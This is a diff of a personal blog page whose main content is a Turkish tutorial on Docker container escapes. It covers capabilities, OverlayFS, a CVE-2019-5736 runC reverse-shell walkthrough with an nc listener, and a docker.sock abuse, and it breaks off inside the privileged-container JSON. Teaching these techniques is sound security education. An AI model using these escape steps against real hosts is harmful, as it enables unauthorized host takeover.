@@ -1,183 +1,188 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <title>
-  Docker Escape · Çetin Boran Mesüm
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
 
-
-
-
-<meta name="author" content="Çetin Boran Mesüm">
-<meta name="description" content="This is Docker 101">
-<meta name="keywords" content="programming,cyber security,personal">
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Docker Escape">
-  <meta name="twitter:description" content="This is Docker 101">
-
-<meta property="og:url" content="http://localhost:1313/posts/docker-escape/">
-  <meta property="og:site_name" content="Çetin Boran Mesüm">
-  <meta property="og:title" content="Docker Escape">
-  <meta property="og:description" content="This is Docker 101">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2024-05-06T17:55:28+08:00">
-    <meta property="article:modified_time" content="2024-05-06T17:55:28+08:00">
-    <meta property="article:tag" content="Docker">
-    <meta property="article:tag" content="Capabilities">
-    <meta property="article:tag" content="Linux">
-    <meta property="article:tag" content="Security">
-
-
-
-
-<link rel="canonical" href="http://localhost:1313/posts/docker-escape/">
-
-
-<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="/css/coder.css" media="screen">
-
-
-
-
-
-
-  
     
     
-    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+    
+    
+    
+    
+
+    
+    <title>Docker Escape</title>
+    <meta name="description" content="This is Docker 101">
+    <meta name="keywords" content='cyber security, programming, Docker, Capabilities, Linux, Security'>
+
+    <meta property="og:url" content="https://cetinboran.netlify.app/posts/docker-escape/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Docker Escape">
+    <meta property="og:description" content="This is Docker 101">
+    <meta property="og:image" content="https://cetinboran.netlify.app/images/author.jpg">
+    <meta property="og:image:secure_url" content="https://cetinboran.netlify.app/images/author.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Docker Escape">
+    <meta name="twitter:description" content="This is Docker 101">
+    <meta property="twitter:domain" content="https://cetinboran.netlify.app/posts/docker-escape/">
+    <meta property="twitter:url" content="https://cetinboran.netlify.app/posts/docker-escape/">
+    <meta name="twitter:image" content="https://cetinboran.netlify.app/images/author.jpg">
+
+    
+    <link rel="canonical" href="https://cetinboran.netlify.app/posts/docker-escape/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.893af8dd3b65bd0ffe90e7af33847bd6dc9180b8fa6d6659a212a6f4b62d3e01.js" integrity="sha256-iTr43TtlvQ/&#43;kOevM4R71tyRgLj6bWZZohKm9LYtPgE="></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
   
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
+    
 </head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
 
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="http://localhost:1313/">
-      Çetin Boran Mesüm
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
         
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/posts/">Posts</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/projects/">Projects</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/contact/">Contact me</a>
-            </li>
-          
+        <div class="avatar">
+            <a href="https://cetinboran.netlify.app/">
+                <img src='/images/author.jpg' alt="Hello">
+            </a>
+        </div>
         
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://cetinboran.netlify.app/">Çetin Boran Mesüm</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://cetinboran.netlify.app/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://cetinboran.netlify.app/posts/"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://cetinboran.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/cetinboran"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target"></span>
+                <a>
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://cetinboran.netlify.app/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://cetinboran.netlify.app/posts/"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://cetinboran.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/cetinboran"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a>
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Docker Escape</h1>
+        <small role="doc-subtitle">This is Docker 101</small>
+        <p class="post-date">May 6, 2024
         
-      </ul>
-    
-  </section>
-</nav>
+        </p>
 
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://cetinboran.netlify.app/tags/docker">Docker</a></li>
+        
+            <li class="post-tag"><a href="https://cetinboran.netlify.app/tags/capabilities">Capabilities</a></li>
+        
+            <li class="post-tag"><a href="https://cetinboran.netlify.app/tags/linux">Linux</a></li>
+        
+            <li class="post-tag"><a href="https://cetinboran.netlify.app/tags/security">Security</a></li>
+        
+        </ul>
+    </div>
 
-    <div class="content">
-      
-  <section class="container page">
-  <article>
-    <header>
-      <h1 class="title">
-        <a class="title-link" href="http://localhost:1313/posts/docker-escape/">
-          Docker Escape
-        </a>
-      </h1>
-    </header>
-
-    <h1 id="docker-escape">
-  Docker Escape
-  <a class="heading-link" href="#docker-escape">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h1>
-<h2 id="1-docker-escape">
-  1. Docker Escape
-  <a class="heading-link" href="#1-docker-escape">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<h3 id="11-basics">
-  1.1 Basics
-  <a class="heading-link" href="#11-basics">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<h4 id="111-capabilities">
-  1.1.1 Capabilities
-  <a class="heading-link" href="#111-capabilities">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+    <div class="post-content">
+        <h1 id="docker-escape">Docker Escape</h1>
+<h2 id="1-docker-escape">1. Docker Escape</h2>
+<h3 id="11-basics">1.1 Basics</h3>
+<h4 id="111-capabilities">1.1.1 Capabilities</h4>
 <p><strong>Nedir?</strong></p>
 <p>Bir kullanıcının veya sürecin sahip olduğu özel izinlerdir. Bu izinler, tipik kullanıcı izinlerinin ötesinde, özel işlemler için ayrıcalıklar sağlar.</p>
 <p><strong>Örnek</strong></p>
@@ -191,9 +196,9 @@
 <p>Tamam ben yetenekleri anladım, bunları nasıl bulurum?</p>
 <p>Bunun için <strong>capsh</strong> kullanabiliriz. <strong>capsh</strong>, linux yeteneklerini incelemek ve yönetmek için kullanılan bir araçtır.</p>
 <p>Eğer <strong>capsh</strong> zafiyet aldığımız makinede yüklü ise direkt <code>capsh --print</code> yazarak bütün sahip olduğu yetenekleri keşfedebiliriz.</p>
-<p><img alt="Difference" src="https://i.hizliresim.com/rmfqv1m.PNG"></p>
+<p><img src="https://i.hizliresim.com/rmfqv1m.PNG" alt="Difference"></p>
 <p>Eğer yüklü değil ise <code>cat /proc/$PID/status</code> dizini altında bütün işlemler hakkında bilgiler yer almakta bu kısımdan yetenekler hakkında bilgi alabiliriz.</p>
-<p><img alt="Difference" src="https://i.hizliresim.com/huqi716.png"></p>
+<p><img src="https://i.hizliresim.com/huqi716.png" alt="Difference"></p>
 <p>Üstteki resimde bir işlemin yeteneklerini görebilirsiniz. Bunu okunabilir bir halde görmek için yine <strong>capsh</strong> kullanıyoruz. <code>capsh --decode=blob</code> yazarsak ve yukarıda mesela <em>CapEff</em> kısmındaki yeri blob kısmına yazarsak bize yine üstteki gibi bir çıktı verecektir.</p>
 <p>Buradaki <em>CapEff</em> <em>CapInh</em> kısımlarına biraz açıklama getirelim.</p>
 <ul>
@@ -210,31 +215,19 @@
 <li><strong><code>SYS_ADMIN</code></strong>: Yeteneği, bir Linux işletim sisteminde kernel düzeyinde çok çeşitli ayrıcalıkları içeren bir yetenektir.</li>
 </ul>
 <p>Tabiki bu kadar az değil bir çok yetenek var dikkat edilmesi gereken. Burada birkaç tane örnek vermek istedim.</p>
-<h4 id="112-overlayfs-overlay-file-system">
-  1.1.2 OverlayFS (Overlay File System)
-  <a class="heading-link" href="#112-overlayfs-overlay-file-system">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="112-overlayfs-overlay-file-system">1.1.2 OverlayFS (Overlay File System)</h4>
 <p><strong>Nedir?</strong></p>
 <p>Linux tabanlı bir dosya sistemi teknolojisidir. İki veya daha fazla dosya sisteminin birleştirilmesine izin verir.</p>
 <p>UpperDir ve LowerDir adı verilen iki ana dizinden oluşur. UpperDir, birleştirilen dosya sisteminde yapılan değişiklikleri içerirken, LowerDir temel dosya sistemini temsil eder. OverlayFS, bu dizinleri birleştirerek birleşik bir dosya sistemini oluşturur ve üst dizinde yapılan değişiklikleri alt dizine uygular.</p>
 <p>Bu kısımda asıl öğretmek istediğim Docker&rsquo;ı çalıştıran Host&rsquo;un bir path yardımı ile konteyner&rsquo;daki dosyalara erişebilmesidir.</p>
 <p><strong>Uygulama</strong></p>
 <p>Alt tarafta yavuzlar adında bir konteyner açıyorum ve bir dosyaya yazı yazıyorum.</p>
-<p><img alt="Difference" src="https://i.hizliresim.com/30pt3lm.PNG"></p>
+<p><img src="https://i.hizliresim.com/30pt3lm.PNG" alt="Difference"></p>
 <p>Burada <code>docker inspect yavuzlar</code> kullanarak <em>UpperDir</em> i alıyorum. Ardından cat ile o oluşturduğum dosyayı okumaya çalıyorum ve komut çalışıyor. Burada host makinede olduğumuza dikkat edelim.</p>
-<p><img alt="Difference" src="https://i.hizliresim.com/3o8jxra.PNG"></p>
-<p>Burada <code>docker inspect yavuzlar</code> yazarak <em>UpperDir</em> pathini almayı başardık. Peki bunu <em>docker escape</em> yaparken nasıl elde edeceğiz. Bunun için alttaki <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes"  class="external-link" target="_blank" rel="noopener">komutu</a> kullanacağız.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">overlay=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` 
-</span></span></code></pre></div><h4 id="113-namespaces">
-  1.1.3 Namespaces
-  <a class="heading-link" href="#113-namespaces">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<p><img src="https://i.hizliresim.com/3o8jxra.PNG" alt="Difference"></p>
+<p>Burada <code>docker inspect yavuzlar</code> yazarak <em>UpperDir</em> pathini almayı başardık. Peki bunu <em>docker escape</em> yaparken nasıl elde edeceğiz. Bunun için alttaki <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes">komutu</a> kullanacağız.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>overlay=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` 
+</span></span></code></pre></div><h4 id="113-namespaces">1.1.3 Namespaces</h4>
 <p><strong>Nedir?</strong></p>
 <p>Bir işletim sistemi çekirdeği özelliğidir ve bir sistemdeki çeşitli sistem kaynaklarını izole etmek için kullanılır. Alt tarafa namespace&rsquo;ler var.</p>
 <ul>
@@ -246,13 +239,7 @@
 <li>IPC</li>
 <li>CGroup</li>
 </ul>
-<h4 id="114-cgroups">
-  1.1.4 CGroups
-  <a class="heading-link" href="#114-cgroups">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="114-cgroups">1.1.4 CGroups</h4>
 <p><strong>Nedir?</strong></p>
 <p>Linux işletim sisteminde kaynak yönetimi ve sınırlama sağlayan bir mekanizmadır. CGroups, sistem üzerinde çalışan işlemlere kaynak tahsisi yapmak, kaynakları izlemek ve sınırlamak için kullanılır. Bu sayede sistem yöneticileri, işlem gruplarına öncelik ve sınırlar belirleyerek sistem kaynaklarını etkin bir şekilde kullanabilirler.</p>
 <p><strong>Kullanıldığı Yerler</strong></p>
@@ -262,29 +249,17 @@
 <li>İzleme ve İstatistikler (Monitoring and Statistics)</li>
 <li>Önceden Tanımlanmış Profiller (Pre-defined Profiles)</li>
 </ul>
-<h4 id="115--linux-security-modules-lsm">
-  1.1.5 – Linux Security Modules (LSM)
-  <a class="heading-link" href="#115--linux-security-modules-lsm">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="115--linux-security-modules-lsm">1.1.5 – Linux Security Modules (LSM)</h4>
 <p><strong>Nedir?</strong></p>
 <p>Linux çekirdeğine eklenen güvenlik altyapısını ifade eder. Bu modüller, çekirdek seviyesinde güvenlik politikalarını uygulayarak sistem güvenliğini artırmaya yardımcı olur.İki yaygın LSM örneği şunlardır: AppArmor ve SELinux.</p>
 <p><strong>AppArmor</strong></p>
-<p>Hem uygulama hem de işletim sistemi düzeyinde güvenlik politikalarını uygular. Profil kullanarak bu işlemleri gerçekleştirir. <a href="https://gitlab.com/apparmor/apparmor/-/wikis/Documentation"  class="external-link" target="_blank" rel="noopener">Documentation</a></p>
+<p>Hem uygulama hem de işletim sistemi düzeyinde güvenlik politikalarını uygular. Profil kullanarak bu işlemleri gerçekleştirir. <a href="https://gitlab.com/apparmor/apparmor/-/wikis/Documentation">Documentation</a></p>
 <p><strong>SELinux</strong></p>
 <p>Kullanıcıların, süreçlerin ve nesnelerin arasındaki erişimi daha ayrıntılı bir şekilde kontrol eder.</p>
 <p><strong>Not</strong></p>
 <p>Docker, enforcement modunda varsayılan bir Linux Security Module (LSM) profili etkinleştirir, bu da çoğunlukla bir konteynerın hassas /proc ve /sys girişlerine erişimini kısıtlamaya hizmet eder.</p>
 <p>Bu profil aynı zamanda mount çağrısını da engeller.</p>
-<h3 id="12-docker-escape">
-  1.2 Docker Escape
-  <a class="heading-link" href="#12-docker-escape">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
+<h3 id="12-docker-escape">1.2 Docker Escape</h3>
 <p><strong>Nedir?</strong></p>
 <p>Docker konteynerların kısıtlı izolasyon ortamından kaçarak (escape ederek) host sistemine erişim sağlamaya çalışan bir güvenlik açığı veya saldırı türünü ifade eder.</p>
 <p><strong>Docker İçinde Olup Olmadığımızı Nasıl Anlarız?</strong></p>
@@ -292,22 +267,10 @@
 <li><code>cat /proc/1/cgroup</code> yazdığımızda içerisinde <em>docker</em> görürsek büyük ihtimalle docker içerisindeyizdir.</li>
 <li>Docker&rsquo;a özgü işlemlere bakılabilir.</li>
 </ul>
-<p><img alt="Difference" src="https://i.hizliresim.com/in44x8i.PNG"></p>
+<p><img src="https://i.hizliresim.com/in44x8i.PNG" alt="Difference"></p>
 <p>Bundan sonra artık örnekler üzerinde anlatacağım.</p>
-<h3 id="13-engine-vulnerabilities">
-  1.3 Engine Vulnerabilities
-  <a class="heading-link" href="#13-engine-vulnerabilities">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<h4 id="runc">
-  RunC
-  <a class="heading-link" href="#runc">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h3 id="13-engine-vulnerabilities">1.3 Engine Vulnerabilities</h3>
+<h4 id="runc">RunC</h4>
 <p>Ilerideki öğrenmek için bilmemiz gereken bir kaç terimi alt tarafta açıklayacağım.</p>
 <p><strong>RunC Nedir?</strong></p>
 <p>Konteynerleri çalıştırmaya yönelik görevleri ele almak üzere kullanılır - bir konteyner oluşturma, mevcut bir konteynere bir işlem bağlama (docker exec) ve benzeri işlemler.</p>
@@ -315,89 +278,59 @@
 <p>Linux işletim sistemlerinde kullanılan bir sanal dosya sistemidir. Bu sanal dosyalar, sistemde çalışan işlemlerin bilgilerinden, donanım kaynaklarının durumundan, ağ istatistiklerinden ve diğer çeşitli sistem bilgilerinden sorumlu olan çekirdek modülü tarafından düzenli olarak güncellenir.</p>
 <p><strong>/proc/self Nedir?</strong></p>
 <p>Çalışan process’in dizinine işaret eden sembolik bir bağlantıdır.</p>
-<p><img alt="Difference" src="https://i.hizliresim.com/ifr9un7.PNG"></p>
+<p><img src="https://i.hizliresim.com/ifr9un7.PNG" alt="Difference"></p>
 <p><strong>/proc/self/exe Nedir?</strong></p>
 <p>Process’in çalıştırdığı yürütülebilir dosyaya işaret eden sembolik bir bağlantıdır.</p>
-<p><img alt="Difference" src="https://i.hizliresim.com/lzzc94q.PNG"></p>
+<p><img src="https://i.hizliresim.com/lzzc94q.PNG" alt="Difference"></p>
 <p><strong>/proc/self/fd Nedir?</strong></p>
 <p>Process tarafından açılan dosya tanımlayıcılarını (file descriptors) içeren bir dizindir.</p>
 <ul>
 <li><strong>file descriptors</strong>: Bir sürecin açık dosyalar veya giriş/çıkış kaynaklarına olan erişimini belirtir. Dosya açma, okuma veya yazma gibi işlemler yapılabilir.</li>
 </ul>
-<h4 id="cve-2019-5736">
-  CVE 2019-5736
-  <a class="heading-link" href="#cve-2019-5736">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="cve-2019-5736">CVE 2019-5736</h4>
 <p>Şimdi zafiyetin mantığına geçebiliriz</p>
 <p>Exploit kodu çalıştığında, ilk olarak <strong>/bin/bash</strong> binary&rsquo;sini <strong>#!/proc/self/exe</strong> ile değiştirir. Bu, eğer <code>docker exec id bash</code> komutu yazılırsa, runC konteynerine giriş yapacak ve bash&rsquo;ı çalıştıracaktır. Ancak bash binary&rsquo;si, <strong>#!/proc/self/exe</strong> olarak değiştirildiği için bu çalışan işlemin yürütülebilir dosyasını gösterdiğinden dolayı, exploit kodu gidip hostta runC&rsquo;yi başlatacaktır.</p>
 <p>Tam bu anda kodun devamında runC işleminin PID sini ve File Descriptor&rsquo;u yakalayacaktır. Bu fd&rsquo;ı da <strong>overwrite</strong> fonksiyonuna yolluyor. Bu fonksiyon ise runC binarysini değiştirip içine <strong>reverse shell</strong> ekleyecektir.</p>
 <p>Bunları yaptıktan sonra konteyner içinde <code>nc -lvnp 4444</code> gibi dinlemeye alırsak host tekrardan <code>docker exec id herhangi-komut</code> çalıştırdığında konteyner&rsquo;a host shell&rsquo;i gelmiş olacaktır.</p>
-<h3 id="14-weak-deployment">
-  1.4 Weak Deployment
-  <a class="heading-link" href="#14-weak-deployment">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
+<h3 id="14-weak-deployment">1.4 Weak Deployment</h3>
 <p>Bu başlık altında kullanıcı tarafından oluşan zafiyetlere örnek vereceğiz.</p>
-<h4 id="mounted-docker-socket">
-  Mounted Docker Socket
-  <a class="heading-link" href="#mounted-docker-socket">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="mounted-docker-socket">Mounted Docker Socket</h4>
 <p><strong>Docker Socket</strong>: Docker konteyner’larda kullanıcı modu ve kernel modu arasında iletişimi sağlar.</p>
 <p><strong>Zafiyetli Makina</strong>: <code>docker run -it -v /var/run/docker.sock:/var/run/docker.sock exposedsocket</code></p>
 <p>Buradaki sıkıntı host&rsquo;un docker.sock dosyası konteyner içine eklenmiş yani konteyner içindekiler bu docker.sock u kullanarak docker ile etkileşime geçebilir.</p>
-<h4 id="exploit">
-  Exploit
-  <a class="heading-link" href="#exploit">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="exploit">Exploit</h4>
 <p>Bu sıkıntıyı exploit etmek için <code>curl</code> ve <code>socat</code> tool&rsquo;larını kullanacağız. Ilk olarak <code>ls /var/run/</code> yazarak gerçekten <strong>docker.sock</strong> dosyası var mı yok mu bakalım.</p>
 <p>Şimdi bu exploitte amacımız kendi konteyner&rsquo;ımızdan çıkıp kendimiz için yüksek yetkide başka konteyner açmak ve oraya geçmektir. Ilk olarak zafiyetli konteyner oluşturmak için bir json yazalım. Bu json ile yeni konteyner&rsquo;ı oluşturacağız.</p>
 <p>Bu alttaki makine <strong>&ndash;privileged</strong> ile başlatılmış ve görüldüğü üzere host&rsquo;un dosyaları konteyner içine eklenmiş. Aslında direkt bu makineye geçtiğimizde host dosyalarına erişebildiğimiz için direkt <em>escape</em> işlemini tamamlamış oluyoruz.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Image&#34;</span><span class="p">:</span> <span class="s2">&#34;ubuntu&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Cmd&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;apt update &amp;&amp; apt install -y python3 &amp;&amp; /bin/sh&#34;</span><span class="p">],</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;DetachKeys&#34;</span><span class="p">:</span> <span class="s2">&#34;Ctrl-p,Ctrl-q&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;OpenStdin&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;HostConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Privileged&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&#34;PidMode&#34;</span><span class="p">:</span> <span class="s2">&#34;host&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&#34;Mounts&#34;</span><span class="p">:</span> <span class="p">[</span>
-</span></span><span class="line"><span class="cl">      <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Type&#34;</span><span class="p">:</span> <span class="s2">&#34;bind&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Source&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Target&#34;</span><span class="p">:</span> <span class="s2">&#34;/host&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">]</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Image&#34;</span>: <span style="color:#e6db74">&#34;ubuntu&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Cmd&#34;</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;apt update &amp;&amp; apt install -y python3 &amp;&amp; /bin/sh&#34;</span>],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;DetachKeys&#34;</span>: <span style="color:#e6db74">&#34;Ctrl-p,Ctrl-q&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;OpenStdin&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;HostConfig&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Privileged&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PidMode&#34;</span>: <span style="color:#e6db74">&#34;host&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Mounts&#34;</span>: [
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Type&#34;</span>: <span style="color:#e6db74">&#34;bind&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Source&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Target&#34;</span>: <span style="color:#e6db74">&#34;/host&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
